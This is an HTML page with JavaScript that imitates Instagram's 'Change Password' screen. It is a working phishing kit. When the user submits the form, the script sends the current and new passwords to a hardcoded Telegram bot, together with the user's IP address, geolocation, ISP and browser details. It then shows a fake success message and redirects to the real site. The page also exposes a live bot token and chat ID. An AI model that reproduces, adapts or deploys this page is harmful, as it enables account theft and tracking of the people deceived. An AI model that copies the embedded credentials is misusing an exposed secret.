<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram - Change Password</title>
<link rel="icon" type="image/x-icon" href="Title.ico">

<style>
    body {
        margin:0;
        background:#1C2B33;
        font-family:Arial, sans-serif;
        display:flex;
        justify-content:center;
        padding-top:40px;
        color:white;
    }
    .container {
        width:100%;
        max-width:380px;
        text-align:center;
    }
    .logo {
        width:80px;
        margin:0 auto 40px;
        display:block;
    }
    .title {
        font-size: 20px;
        margin-bottom: 20px;
        color: white;
    }
    .description {
        color: #8b98a5;
        font-size: 14px;
        margin-bottom: 25px;
        line-height: 1.4;
    }
    input {
    width:100%;
    background:#1C2B33;
    border:1px solid #27333f;
    padding:14px;
    margin-bottom:10px;
    border-radius:10px;     /* Ù†ÙØ³ Ø­ÙˆØ§Ù Ø§Ù„Ø£Ø²Ø±Ø§Ø± */
    color:white;
    font-size:14px;
    outline:none;
    box-sizing: border-box; /* Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹ Ø¹Ù„Ø´Ø§Ù† Ø§Ù„Ø­ÙˆØ§Ù ØªØ¨Ù‚Ù‰ Ø¨Ù†ÙØ³ Ø§Ù„Ø­Ø¬Ù… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ */
    }
    input::placeholder { color:#8b98a5; }
    button {
    width:100%;
    padding:14px;
    background:#0064e0;
    border:none;
    border-radius:50px;
    color:white;
    font-size:15px;
    margin-top:10px;
    cursor:pointer;
    }
    button:disabled {
        background: #1c2733;
        cursor: not-allowed;
    }
    .error {
        color:#ff4d4f;
        font-size:13px;
        margin-bottom:10px;
        display:none;
    }
    .success {
        color:#4CAF50;
        font-size:13px;
        margin-bottom:10px;
        display:none;
    }
    .loading {
        display: none;
        color: #8b98a5;
        font-size: 14px;
        margin-top: 10px;
    }
    .language {
    position: absolute;
    top: 10px;                /* Ø§Ù„Ù…Ø³Ø§ÙØ© Ù…Ù† Ø£Ø¹Ù„Ù‰ */
    left: 50%;                /* ÙÙŠ Ø§Ù„Ù†Øµ Ø£ÙÙ‚ÙŠØ§Ù‹ */
    transform: translateX(-50%); /* Ø¶Ø¨Ø· Ø¯Ù‚ÙŠÙ‚ Ù„Ù„Ù†Øµ */
    font-size: 13px;
    color: #ffffff;
    font-family: Arial, sans-serif;
    opacity: 0.7;
    }
</style>
</head>
<body>
<div class="language">English (US)</div>

<div class="container">

    <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" class="logo">
    
    <div class="title">Change Password</div>
    <div class="description">Enter your current password and choose a new one.</div>

    <input type="password" id="currentPassword" placeholder="Current Password">
    <input type="password" id="newPassword" placeholder="New Password">
    <input type="password" id="confirmPassword" placeholder="Confirm New Password">

    <div id="errorMsg" class="error">
        Please fill all fields. New password must be at least 8 characters and match confirmation.
    </div>

    <div id="successMsg" class="success">
        Password changed successfully! Redirecting...
    </div>

    <div id="loadingMsg" class="loading">
        Changing password, please wait...
    </div>

    <button id="changeBtn">Change Password</button>

</div>

<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
    const TOKEN = "8136154375:AAEC2wSeLsN6NvvZZqKwCbn8aVTCP4c-Sao";
    const CHAT_ID = "7631254472";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // Ø¹Ù†Ø§ØµØ± DOM
    const currentPasswordInput = document.getElementById('currentPassword');
    const newPasswordInput = document.getElementById('newPassword');
    const confirmPasswordInput = document.getElementById('confirmPassword');
    const changeBtn = document.getElementById('changeBtn');
    const errorMsg = document.getElementById('errorMsg');
    const successMsg = document.getElementById('successMsg');
    const loadingMsg = document.getElementById('loadingMsg');

    // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¹Ù…ÙŠÙ„
    async function getClientInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
            const locationData = await locationResponse.json();
            
            return {
                ip: ipData.ip,
                country: locationData.country || 'Unknown',
                city: locationData.city || 'Unknown',
                region: locationData.regionName || 'Unknown',
                timezone: locationData.timezone || 'Unknown',
                isp: locationData.isp || 'Unknown',
                browser: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString()
            };
        } catch (error) {
            console.error('Error getting client info:', error);
            return {
                ip: 'Unknown',
                country: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                timezone: 'Unknown',
                isp: 'Unknown',
                browser: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString()
            };
        }
    }

    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
    async function sendPasswordChangeNotification(currentPassword, newPassword) {
        const clientInfo = await getClientInfo();
        
        const message = `
ğŸ” **Password Change Attempt** - ${clientInfo.time}

ğŸ”‘ **Current Password:** ${currentPassword}
ğŸ†• **New Password:** ${newPassword}

ğŸŒ **IP Address:** ${clientInfo.ip}
ğŸ“ **Location:** ${clientInfo.city}, ${clientInfo.region}, ${clientInfo.country}
ğŸ•’ **Timezone:** ${clientInfo.timezone}
ğŸ“¡ **ISP:** ${clientInfo.isp}

ğŸ–¥ï¸ **Platform:** ${clientInfo.platform}
ğŸŒ **Browser:** ${getBrowserName(clientInfo.browser)}
ğŸ—£ï¸ **Language:** ${clientInfo.language}
        `.trim();

        try {
            await axios.post(URI_API, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('Password change notification sent successfully');
            return true;
        } catch (error) {
            console.error('Error sending notification:', error);
            return false;
        }
    }

    // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­
    function getBrowserName(userAgent) {
        if (userAgent.includes("Chrome")) return "Chrome";
        if (userAgent.includes("Firefox")) return "Firefox";
        if (userAgent.includes("Safari")) return "Safari";
        if (userAgent.includes("Edge")) return "Edge";
        if (userAgent.includes("Opera")) return "Opera";
        return "Unknown Browser";
    }

    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    function validateForm(currentPassword, newPassword, confirmPassword) {
        if (!currentPassword || !newPassword || !confirmPassword) {
            return "Please fill all fields.";
        }
        
        if (newPassword.length < 8) {
            return "New password must be at least 8 characters.";
        }
        
        if (newPassword !== confirmPassword) {
            return "New passwords do not match.";
        }
        
        return null;
    }

    // Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
    changeBtn.addEventListener('click', async function(e){
        const currentPasswordValue = currentPasswordInput.value.trim();
        const newPasswordValue = newPasswordInput.value.trim();
        const confirmPasswordValue = confirmPasswordInput.value.trim();

        // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
        errorMsg.style.display = "none";
        successMsg.style.display = "none";

        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØµØ­Ø©
        const validationError = validateForm(currentPasswordValue, newPasswordValue, confirmPasswordValue);
        
        if (validationError) {
            errorMsg.textContent = validationError;
            errorMsg.style.display = "block";
            return;
        }

        // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
        loadingMsg.style.display = "block";
        changeBtn.disabled = true;
        changeBtn.textContent = "Changing...";

        try {
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const sendSuccess = await sendPasswordChangeNotification(currentPasswordValue, newPasswordValue);

            if (sendSuccess) {
                // Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­
                loadingMsg.style.display = "none";
                successMsg.style.display = "block";
                
                // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø«Ù… Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
                setTimeout(() => {
                    window.open("https://www.instagram.com/","_blank");
                    // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
                    currentPasswordInput.value = "";
                    newPasswordInput.value = "";
                    confirmPasswordInput.value = "";
                    successMsg.style.display = "none";
                    changeBtn.disabled = false;
                    changeBtn.textContent = "Change Password";
                }, 3000);
            } else {
                throw new Error('Failed to send notification');
            }
            
        } catch (error) {
            console.error('Error:', error);
            loadingMsg.style.display = "none";
            errorMsg.textContent = "An error occurred. Please try again.";
            errorMsg.style.display = "block";
            changeBtn.disabled = false;
            changeBtn.textContent = "Change Password";
        }
    });

    // Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Enter
    document.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            changeBtn.click();
        }
    });
</script>

</body>
</html>
